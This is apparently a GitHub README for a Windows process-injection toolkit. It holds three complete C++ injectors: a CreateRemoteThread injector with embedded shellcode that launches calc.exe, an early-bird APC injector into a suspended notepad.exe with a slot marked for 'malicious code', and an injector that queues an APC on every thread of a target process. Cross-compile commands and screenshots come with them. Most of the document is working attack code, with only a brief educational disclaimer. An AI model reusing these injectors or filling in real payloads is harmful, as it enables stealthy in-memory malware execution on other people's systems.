
# 🔥 Process Injection 🔥

![C++](https://img.shields.io/badge/C++-17-blue?style=for-the-badge&logo=cplusplus)
![Windows](https://img.shields.io/badge/Windows-API-red?style=for-the-badge&logo=windows)
![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey?style=for-the-badge)


# 🏗️ Code Structure
// 🎯 Main injection workflow:
1. OpenProcess()          // Get handle to target process
2. VirtualAllocEx()       // Allocate memory in remote process  
3. WriteProcessMemory()   // Write shellcode to remote memory
4. CreateRemoteThread()   // Execute shellcode remotely
5. Cleanup handles        // Proper resource management

---

# 🔧 Technical Details
## 🎯 Built-in Shellcode

The tool includes a default shellcode payload that executes calc.exe - perfect for demonstration and testing purposes.
## 🛡️ Memory Protection

    Uses PAGE_EXECUTE_READWRITE memory protection

    Proper handle cleanup to prevent resource leaks

    Error checking at each step

## 📊 API Functions Used

    OpenProcess() - Process access

    VirtualAllocEx() - Remote memory allocation

    WriteProcessMemory() - Memory writing

    CreateRemoteThread() - Remote execution

    CloseHandle() - Resource cleanup

# ⚠️ Disclaimer

    🚨 IMPORTANT: This is for educational and research purposes only!

    Use only on systems you own and have permission to test

    Do not use for malicious activities

    The authors are not responsible for misuse

    Always comply with local laws and regulations

---

## shellcode_inject.cpp

```cpp
#include <Windows.h>
#include <iostream>

int main(int argc, char* argv[]) {


	// target process id.........
	int pid = atoi(argv[1]);


	HANDLE pHandle = NULL;
	PVOID rBuffer = NULL;

	// shellcode.....
	unsigned char buf[] = 
	"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
	"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
	"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
	"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
	"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
	"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
	"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
	"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
	"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
	"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
	"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
	"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
	"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
	"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
	"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
	"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";



	pHandle = OpenProcess(
		PROCESS_ALL_ACCESS,
		FALSE,
		DWORD(pid));

	printf("Handle to pid...[%i] is : %p\n", pid, pHandle);

	system("pause");

	rBuffer = VirtualAllocEx(
		pHandle,
		NULL,
		sizeof(buf),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE

	);

	printf("Memory allocated.............");

	system("pause");


	WriteProcessMemory(
		pHandle,
		rBuffer,
		buf,
		sizeof(buf),
		NULL);

	printf("Wrote shellcode into process memory..PID: %i", pid);

	system("pause");

	HANDLE hThread = CreateRemoteThread(
		pHandle,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)rBuffer,
		NULL,
		0,
		NULL
	);

	printf("Remote thread %p created in PID: %i", hThread, pid);

	CloseHandle(hThread);
	CloseHandle(pHandle);

	return 0;

}
```

---

## Cross Compilation

```bash
kant@APPLEs-MacBook-Pro ~/m/shellcode-injection> x86_64-w64-mingw32-g++ shellcode_inject.cpp -static -o inject
kant@APPLEs-MacBook-Pro ~/m/shellcode-injection> file inject.exe 
inject.exe: PE32+ executable (console) x86-64, for MS Windows, 19 sections
kant@APPLEs-MacBook-Pro ~/m/shellcode-injection>
```

---

<img width="1064" height="429" alt="file_2025-09-18_08 46 06" src="https://github.com/user-attachments/assets/3bea7c5a-61df-4da5-8a8b-084c9f223081" />

---


<img width="1270" height="627" alt="file_2025-09-18_08 45 44" src="https://github.com/user-attachments/assets/f279d06d-9360-4f34-bd95-510a459b81b7" />



---

---

---



# 🚀 Asynchronous Procedure Call (APC) Injection

---
## ✨ Introduction

Asynchronous Procedure Call (APC) Injection is a super cool technique that allows you to execute custom code within the context of another process! 🎯 It's like whispering a secret command to a program while it's sleeping. 😴➡️👂

This method is favored by red teams and security researchers because it's stealthy, fileless, and operates entirely in memory! 🧠💥
## 🔧 How APC Injection Works

Here's the magical process in simple terms:

    Freeze a Process ❄️ - Start a program but pause it immediately

    Allocate Memory 🏗️ - Create space in the target process's memory

    Write Payload ✍️ - Insert your code into that memory space

    Schedule Execution ⏰ - Tell the process to run your code when it wakes up

    Resume Process ▶️ - Unfreeze the process, executing your code!

---

1. Spawn a process in suspended state

	- The program starts notepad.exe but keeps its main thread suspended so nothing runs immediately. This gives the injector time to prepare the target process.

2. Allocate memory inside the target process

	- VirtualAllocEx asks the target process to reserve a region of memory that will later be used to hold the payload.

3. Write bytes into that memory

	- WriteProcessMemory copies the local payload[] bytes into the remote process's newly allocated memory.

4. Queue an APC

	- QueueUserAPC queues a callback (the address of the injected bytes) on the target thread — the OS will run that callback in the context of the target thread 	when it is alertable.

5. Resume thread so APC can execute

	- ResumeThread lets the suspended thread run again; when conditions are right the queued APC will be executed and the payload runs inside the target process.

```cpp
#include <Windows.h>
#include <stdio.h>

char payload[] = "";  // 🎯 YOUR MALICIOUS CODE GOES HERE!


unsigned int payload_len = sizeof(payload);  // 📏 AUTO-MAGICALLY CALCULATES CODE SIZE


int main(int argc, char **argv) {

    int pid = 0;
    HANDLE hProc = NULL;
    STARTUPINFO si;          // 📋 BLUEPRINT FOR NEW PROCESS
    PROCESS_INFORMATION pi;  // 📊 PROCESS ID CARD
    void * newMemorySpace;   // 🧠 FUTURE HOME FOR YOUR PAYLOAD
    
    // 🧹 CLEAN SLATE TECHNIQUE
    ZeroMemory( &si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi));

    // 🎪 CREATE NOTEPAD BUT FREEZE IT MID-AIR!
    CreateProcessA(0, "notepad.exe", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);
    
    // ⏸️  PAUSE BUTTON - PRESS ENTER TO CONTINUE
    getchar();
    
    // 🏗️  ALLOCATE STEALTH MEMORY IN NOTEPAD'S BRAIN
    newMemorySpace = VirtualAllocEx(pi.hProcess, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    
    // ✍️  WRITE YOUR PAYLOAD INTO NOTEPAD'S MEMORY
    WriteProcessMemory(pi.hProcess, newMemorySpace, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
    
    // 🎯 SLIP YOUR CODE INTO NOTEPAD'S THOUGHT PROCESS
    QueueUserAPC((PAPCFUNC)newMemorySpace, pi.hThread, NULL);
    
    // ▶️  UNFREEZE NOTEPAD - NOW EXECUTING YOUR CODE!
    ResumeThread(pi.hThread);
    
    return 0;
}
```

---


## Cross Compilation

```bash
x86_64-w64-mingw32-g++ apc_inject.cpp -o apc_inject -I/usr/share/mingw-w64/include -L/usr/lib -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -Wnarrowing -fexceptions
```

---

## Execution

---

<img width="1183" height="745" alt="Screenshot 2025-09-20 at 5 52 47 PM" src="https://github.com/user-attachments/assets/f7a6455b-7303-4d37-bcee-03dcc54ab991" />

---

# 🚀 APC injection via Queue an APC into all the threads

```cpp
/*
APC injection via Queue an APC into all the threads...
*/

#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <vector>
#include <stdio.h>

unsigned char payload[] = "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x48\x31\xd2\x56\x65\x48\x8b\x52\x60"
	"\x48\x8b\x52\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x0f\xb7"
	"\x4a\x4a\x48\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02"
	"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b"
	"\x52\x20\x8b\x42\x3c\x41\x51\x48\x01\xd0\x66\x81\x78\x18"
	"\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
	"\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x44\x8b\x40\x20\x8b"
	"\x48\x18\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88"
	"\x4d\x31\xc9\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d"
	"\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
	"\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
	"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41"
	"\x58\x41\x58\x48\x01\xd0\x5e\x59\x5a\x41\x58\x41\x59\x41"
	"\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
	"\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
	"\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"
	"\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x2a"
	"\x00\x00\x00\x48\x65\x79\x20\x62\x61\x62\x79\x2e\x2e\x2e"
	"\x2e\x2e\x2e\x2e\x41\x50\x43\x20\x69\x6e\x6a\x65\x63\x74"
	"\x69\x6f\x6e\x20\x76\x69\x61\x20\x51\x75\x65\x75\x65\x21"
	"\x21\x21\x00\x5a\xe8\x0a\x00\x00\x00\x66\x72\x6f\x6d\x20"
	"\x4b\x41\x4e\x54\x00\x41\x58\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff"
	"\xd5";

unsigned int payload_len = sizeof(payload);

int findMyProc(const char *procname) {

	HANDLE hSnapshot;
	PROCESSENTRY32 pe;
	int pid = 0;
	BOOL hResult;

	//snapshot of all processes in the system
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

	//initializing size needed for using Process32First
	pe.dwSize = sizeof(PROCESSENTRY32);

	//info about first process encounterd in snapshot...
	hResult = Process32First(hSnapshot, &pe);

	//retrieve information about the processes
	//exit if unsucessful...
	while (hResult) {
		// if process id found return it....
		if(strcmp(procname, pe.szExeFile) == 0) {
			pid = pe.th32ProcessID;
			break;
		}
		hResult = Process32Next(hSnapshot, &pe);
	}

	//close an open handle (CreateToolhelp32Snapshot)
	CloseHandle(hSnapshot);
	return pid;
}

//find process by thread id...

DWORD getTids(DWORD pid, std::vector<DWORD>& tids) {
	HANDLE hSnapshot;
	THREADENTRY32 te;
	te.dwSize = sizeof(THREADENTRY32);

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	if (Thread32First(hSnapshot, &te)) {
		do {
			if (pid == te.th32OwnerProcessID) {
				tids.push_back(te.th32ThreadID);
			}
		} while (Thread32Next(hSnapshot, &te));
	}

	CloseHandle(hSnapshot);
	return !tids.empty();

}

int main(int argc, char* argv[]) {
	DWORD pid = 0; //process id...
	HANDLE ph; // process handle...
	HANDLE ht; //thread handle
	LPVOID rb; //remote buffer...
	std::vector<DWORD> tids; //thread ids.......

	pid = findMyProc(argv[1]);
	if(pid == 0) {
		printf("PID not found you donkey....\n");
		return -1;
	} else {
		printf("PID = %d\n", pid);

		ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
		if (ph == NULL) {
			printf("OpenProcess failed!!....\n");
			return -2;
		}
		//allocate memory for buffer.......
		rb = VirtualAllocEx(ph, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		// write payload to memory buffer...
		WriteProcessMemory(ph, rb, payload, payload_len, NULL);

		if(getTids(pid, tids)) {
			for (DWORD tid : tids) {
				HANDLE ht = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
				if (ht) {
					QueueUserAPC((PAPCFUNC)rb, ht, NULL);
					printf("paylod injected via QueueUserAPC baby!!!\n");
					CloseHandle(ht);
				}
			}
		}
		CloseHandle(ph);

	}
	return 0;
}

```

---

## Cross Compilation

```bash
x86_64-w64-mingw32-g++ mark2.cpp -o mark2 -I/usr/share/mingw-w64/include -L/usr/lib -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -Wnarrowing -fexceptions
```

## Execution:

<img width="1172" height="660" alt="Screenshot 2025-10-16 at 11 13 59 AM" src="https://github.com/user-attachments/assets/ccc122e7-a15c-4b2e-a6a7-42f56d9aeb4d" />


---
---



